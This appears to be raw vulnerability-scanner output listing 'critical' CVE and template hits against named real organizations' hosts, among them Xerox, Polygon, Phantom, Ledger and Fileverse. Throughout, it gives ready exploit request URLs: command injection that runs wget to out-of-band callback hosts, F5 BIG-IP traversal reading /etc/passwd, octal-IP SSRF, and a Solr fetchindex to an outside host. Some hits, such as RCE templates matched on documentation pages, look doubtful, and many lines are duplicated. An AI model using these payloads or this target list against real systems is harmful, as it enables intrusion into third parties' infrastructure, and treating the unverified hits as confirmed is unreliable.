+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ui.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-wts.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-1.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.dev-1.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-3.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.dev-3.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-connex.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-connex.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.dev-connex.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-netmgr.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dev-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.doc-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.doc-1.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.int-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.int-2.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.int-3.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-patch-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.int-patch-2.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-patch.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.int-patch.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.int-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.pft-1.pft1.swiat.io/config/config.json [""baseUrl": "https://swiat.pft-1.pft1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.qa-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-2.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-3.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.qa-3.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-deka.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.qa-deka.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-ssf-3.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qa-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://swiat.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qanet-ssf.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.qanet.swiat.io/config/config.json [""baseUrl": "https://swiat.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiatregistrar.demo-kfw.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://test.swiat.io/config/config.json [""baseUrl": "https://test.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://testnetmgr.swiat.io/config/config.json [""baseUrl": "https://testnetmgr.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://trade-guardian.demo.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://trade-guardian.dev-tg.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://trust.demo-deka-aircraft-finance.demo2.swiat.io/config/config.json [""baseUrl": "https://trust.demo-deka-aircraft-finance.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://tt.demo-tt.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://uat.swiat.io/config/config.json [""baseUrl": "https://uat.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ui.demo-ui.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://wts.demo-wts.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.nexus.xyz
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da05jlaai4kjlh8gvtbg97rg1bztbfbmg.oast.pro;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da05jlaai4kjlh8gvtbgs59rpw5ppwpkf.oast.pro;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da09rp2ai4kjlg9m3jpgebd7b8mydqxt3.oast.pro;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da09rp2ai4kjlg9m3jpgxias5r6g4zi4r.oast.pro;
+[CVE-2020-3952:version] [http] [critical] https://vlpconproxy-msp.support.xerox.com/sdk/ ["4.0.0"]
+[CVE-2020-5902] [http] [critical] https://vcm08.external.xerox.com/tmui/locallb/workspace/tmshCmd.jsp
+[CVE-2020-5902] [http] [critical] https://vcm08.external.xerox.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
+[CVE-2020-5902] [http] [critical] https://vcm08.external.xerox.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+[CVE-2021-27905] [http] [critical] https://fileshare-eu.services.xerox.com/solr/prod-2/replication/?command=fetchindex&masterUrl=https://interact.sh
+[CVE-2021-28918] [http] [critical] https://legacy-docs.across.to/?url=http://0177.0.0.1/server-status
+[CVE-2022-1388] [http] [critical] https://vcm08.external.xerox.com/mgmt/tm/util/bash
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da05jlaai4kjlh8gvtbgrgofraxm5a6mg.oast.pro;
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da09rp2ai4kjlg9m3jpgissdqc5gqerdg.oast.pro;
+[CVE-2022-26143:version] [http] [critical] https://chat.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.dev.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.staging.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2023-34048:version] [http] [critical] https://vlpconproxy-msp.support.xerox.com/sdk/ ["4.0.0"]
+[CVE-2024-45216] [http] [critical] https://fileshare-eu.services.xerox.com/solr/admin/info/properties:/admin/info/key
+[CVE-2025-54236] [http] [critical] https://chat.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.dev.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.staging.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://mcstaging.shop.xerox.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://www.shop.xerox.com/customer/address_file/upload
+[CVE-2025-55182] [http] [critical] https://dashboard.layeredge.io
+[CVE-2025-55182] [http] [critical] https://explorer.layeredge.io
+[CVE-2025-55182] [http] [critical] https://semi.explorer.layeredge.io
+[CVE-2025-55182] [http] [critical] https://znode.rivalz.ai
+[CVE-2026-21858] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-21877] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-33017] [http] [critical] https://chat.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.dev.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.staging.dappier.com/api/v1/version
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.across.to
+[CVE-2019-20933] [http] [critical] https://remote-write.switchboard.xyz/query?db=db&q=SHOW%20DATABASES
+[CVE-2021-28918] [http] [critical] https://agentic-docs.polygon.technology/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://doc.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://docs.nexus.xyz/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://whitepaper.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2024-29972] [http] [critical] https://cli.nexus.xyz/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc
+[CVE-2025-2294] [http] [critical] https://agentic-docs.polygon.technology/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=../../../../../../../../etc/passwd
+[CVE-2025-49825] [http] [critical] https://teleport.infra.switchboard.xyz/webapi/ping ["Teleport Version: 17.5.1"]
+[CVE-2026-24207] [http] [critical] https://smolclyde-api.treasure.lol/models
+[CVE-2026-33032] [http] [critical] https://rpc-alchemy.scroll.io/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc1.monad.xyz/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.monad.xyz/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-backend.phantom.app/mcp_message
+[config-json-exposure-fuzz:api_credentials] [http] [critical] https://farcaster-sync-cf-workflow.b3.fun/application.json [""api_key":"Pass API key via x-api-key header""] [path="/application.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://portal.api.prd.ledger.com/assets/config.json [""baseURL": "https://mapi.eu.326ada.api.gravitee.io/portal""] [path="/assets/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://api.pol.polygon.technology/config/production.json [""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a85cd6fce8b63d6648d00c_Lisovo%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6995e91bcb79c45fc0dac26f_SequenceBlog.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691c5846dcf017ba7c793229_Revolut_Static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69020f49116940f0fb7db535_DCS_Static_Cover%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a04f1393460fd20f8ea736_JPYC.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699de5f66450794cfac25a6d_Blog_Feb24%20(1)%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699cbac0e45c0489bc294741_Coinme_Trust%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69723c17303550ee9d55483b_putting%20open%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/696f89fabb9df6b3a1ceed65_RZ_Announcement_v_01%20(0-00-08-03).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6903604aef39b3d82be0568e_Flutterwave_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68dd0aa6fda8da7470558a33_immutable%20play%20polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1d9a81e825fb2f84c4589_wallets.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691b520eb0d404ae85ca1cb3_Mastercard_Polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69148a21d70a7d1e370622d9_Calastone_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68af229e0133476c8d9e7a64_Polygon_x_USDT0.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6954143928fc41e2df1645eb_2%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6942b3f50b2ffe7ce3229ee6_BOYSCLUB%20X%20POLYGON.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68f25ca38b5f6f2fd178cc59_payments%20101.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68b88332d8385ea67b4c228b_MATICPOL_Complete%20(1).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69aab8614ac41c9231109fbb_LATAM%20stablecoins.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6e6a6c2db55d73cf2abb1_FINAL%20Polygon%20x%20DeCard.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699f40a0f9a722034fa0ca1b_BBRL%20(3).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6900b8d1de6bc44e36ebd740_Manifold_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e79c99358a38cf7f9916c2_Amina%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68de664c017b0e26ed0b4d74_Alloy%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6915fa915a5be905fd5f1fad_R25.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e66a1e9e9ebb1e98d50e50_Rio%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1fc8b98c13f922256601b_putting%20the%20stack%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6980badd87658ae7ec957cae_coinme%20case%20study.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69664feb9a8a61663ce88321_blog%20cover%20(2).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68cc2c7dc86d93a882d89cd1_CypherxPOL_1_2.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a998d755abe5d473050e17_CLI%206%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6fc8342715be79b193097_Paxos%20on%20Polygon_Blog%20Cover%201%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/694972be7338f7e4c6bf7271_Shift4%20announcement.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69445d06e82705ca170a9aa8_non-USD%20stablecoin%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69380c8564deb621bdca89fa_Madhugiri_static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68c360404529c241473e4b5d_Rio_Testnet%20blog%20cover.jpg""] [path="/config/production.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://farcaster-sync-cf-workflow.b3.fun/application.json ["https://api.b3.fun/auth"] [path="/application.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
+[pdf-signer-ssti-to-rce] [http] [critical] https://agentic-docs.polygon.technology
+[pdf-signer-ssti-to-rce] [http] [critical] https://doc.particle.network
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.nexus.xyz
+[pdf-signer-ssti-to-rce] [http] [critical] https://whitepaper.particle.network
+[CVE-2026-33032] [http] [critical] https://rpc.katana.network/mcp_message
+[CVE-2021-28918] [http] [critical] https://docs.blockend.com/?url=http://0177.0.0.1/server-status
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.blockend.com
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://mobile-api.mayan.finance/config.development.json [""url":"https://discord.gg/h5HUzkqrXK"",""url":"https://twitter.com/mayanfinance"",""url":"https://blog.mayan.finance/"",""url":"https://docs.mayan.finance/""] [path="/config.development.json"]
+[CVE-2021-28918] [http] [critical] https://docs.nubit.org/?url=http://0177.0.0.1/server-status
+[CVE-2025-29927] [http] [critical] https://app.v1.mitosis.org
+[CVE-2025-29927] [http] [critical] https://morph.mitosis.org
+[CVE-2026-21445] [http] [critical] https://agent-test.chainopera.ai/api/v1/monitor/messages
+[CVE-2026-24207] [http] [critical] https://smolclyde-api.treasure.lol/models
+[CVE-2026-33017] [http] [critical] https://agent-test.chainopera.ai/api/v1/version
+[CVE-2026-33017] [http] [critical] https://agent.chainopera.ai/api/v1/version
+[CVE-2026-55450] [http] [critical] https://agent-test.chainopera.ai/api/v1/upload/11111111-1111-1111-1111-111111111111
+[CVE-2026-55450] [http] [critical] https://agent.chainopera.ai/api/v1/upload/11111111-1111-1111-1111-111111111111
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.nubit.org
+[CVE-2025-29927] [http] [critical] https://mozai.rivalz.ai
+[CVE-2025-55182] [http] [critical] https://explorer.layeredge.io
+[CVE-2025-55182] [http] [critical] https://semi.explorer.layeredge.io
+[CVE-2025-55182] [http] [critical] https://znode.rivalz.ai
+[CVE-2021-28918] [http] [critical] https://docs.nexus.xyz/?url=http://0177.0.0.1/server-status
+[CVE-2024-29972] [http] [critical] https://cli.nexus.xyz/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc
+[CVE-2026-24207] [http] [critical] https://smolclyde-api.treasure.lol/models
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.nexus.xyz
+[CVE-2021-28918] [http] [critical] https://docs.nubit.org/?url=http://0177.0.0.1/server-status
+[CVE-2026-21445] [http] [critical] https://agent-test.chainopera.ai/api/v1/monitor/messages
+[CVE-2026-33017] [http] [critical] https://agent-test.chainopera.ai/api/v1/version
+[CVE-2026-33017] [http] [critical] https://agent.chainopera.ai/api/v1/version
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.nubit.org
+[CVE-2021-28918] [http] [critical] https://docs.reya.xyz/?url=http://0177.0.0.1/server-status
+[CVE-2025-29927] [http] [critical] https://app.yup.io
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.reya.xyz
+[CVE-2021-28918] [http] [critical] https://docs.yieldnest.finance/?url=http://0177.0.0.1/server-status
+[CVE-2026-33032] [http] [critical] https://rpc1.monad.xyz/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.monad.xyz/mcp_message
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.yieldnest.finance
+[CVE-2021-28918] [http] [critical] https://agentic-docs.polygon.technology/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://legacy-docs.across.to/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://whitepaper.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2025-2294] [http] [critical] https://agentic-docs.polygon.technology/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=../../../../../../../../etc/passwd
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://api.pol.polygon.technology/configs.json [""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e66a1e9e9ebb1e98d50e50_Rio%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/694972be7338f7e4c6bf7271_Shift4%20announcement.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691c5846dcf017ba7c793229_Revolut_Static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69aab8614ac41c9231109fbb_LATAM%20stablecoins.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a998d755abe5d473050e17_CLI%206%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6e6a6c2db55d73cf2abb1_FINAL%20Polygon%20x%20DeCard.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1fc8b98c13f922256601b_putting%20the%20stack%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69664feb9a8a61663ce88321_blog%20cover%20(2).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68dd0aa6fda8da7470558a33_immutable%20play%20polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69148a21d70a7d1e370622d9_Calastone_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6995e91bcb79c45fc0dac26f_SequenceBlog.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a85cd6fce8b63d6648d00c_Lisovo%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1d9a81e825fb2f84c4589_wallets.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699f40a0f9a722034fa0ca1b_BBRL%20(3).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68de664c017b0e26ed0b4d74_Alloy%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68c360404529c241473e4b5d_Rio_Testnet%20blog%20cover.jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69723c17303550ee9d55483b_putting%20open%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69445d06e82705ca170a9aa8_non-USD%20stablecoin%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691b520eb0d404ae85ca1cb3_Mastercard_Polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6900b8d1de6bc44e36ebd740_Manifold_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e79c99358a38cf7f9916c2_Amina%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68b88332d8385ea67b4c228b_MATICPOL_Complete%20(1).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6980badd87658ae7ec957cae_coinme%20case%20study.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a04f1393460fd20f8ea736_JPYC.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6954143928fc41e2df1645eb_2%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68af229e0133476c8d9e7a64_Polygon_x_USDT0.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6942b3f50b2ffe7ce3229ee6_BOYSCLUB%20X%20POLYGON.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68f25ca38b5f6f2fd178cc59_payments%20101.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68cc2c7dc86d93a882d89cd1_CypherxPOL_1_2.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699de5f66450794cfac25a6d_Blog_Feb24%20(1)%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/696f89fabb9df6b3a1ceed65_RZ_Announcement_v_01%20(0-00-08-03).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69380c8564deb621bdca89fa_Madhugiri_static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6903604aef39b3d82be0568e_Flutterwave_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69020f49116940f0fb7db535_DCS_Static_Cover%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6fc8342715be79b193097_Paxos%20on%20Polygon_Blog%20Cover%201%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699cbac0e45c0489bc294741_Coinme_Trust%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6915fa915a5be905fd5f1fad_R25.png""] [path="/configs.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://mobile-api.mayan.finance/config.json [""url":"https://discord.gg/h5HUzkqrXK"",""url":"https://twitter.com/mayanfinance"",""url":"https://blog.mayan.finance/"",""url":"https://docs.mayan.finance/""] [path="/config.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://agentic-docs.polygon.technology
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.across.to
+[CVE-2026-33032] [http] [critical] https://relayer-testnet.zerodev.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://relayer.zerodev.app/mcp_message
+[CVE-2025-29927] [http] [critical] https://mozai.rivalz.ai
+[CVE-2025-55182] [http] [critical] https://xxl-job.orderly.network
+[CVE-2025-55182] [http] [critical] https://znode.rivalz.ai
+[CVE-2026-33032] [http] [critical] https://rpc.katana.network/mcp_message
+[config-json-exposure-fuzz:api_credentials] [http] [critical] https://farcaster-sync-cf-workflow.b3.fun/config.json [""api_key":"Pass API key via x-api-key header""] [path="/config.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://farcaster-sync-cf-workflow.b3.fun/config.json ["https://api.b3.fun/auth"] [path="/config.json"]
+[inspur-clusterengine-rce] [http] [critical] https://docs.availproject.org/docs/da/user-guides/staking-governance/overview
+[openwebui-default-login] [http] [critical] https://llm.availproject.org/api/v1/auths/signin
+[CVE-2020-4429] [javascript] [critical] 1f771a89d395bd00.dyndns.dappnode.io:22
+[CVE-2014-3206] [http] [critical] https://fakevod.ant.fun/backupmgt/localJob.php?session=fail;wget+http://d9krflklr2r3erlen4lghgoqm5yob3b4g.oast.site;
+[CVE-2014-3206] [http] [critical] https://fakevod.ant.fun/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9krflklr2r3erlen4lg8764z4dwka38k.oast.site;
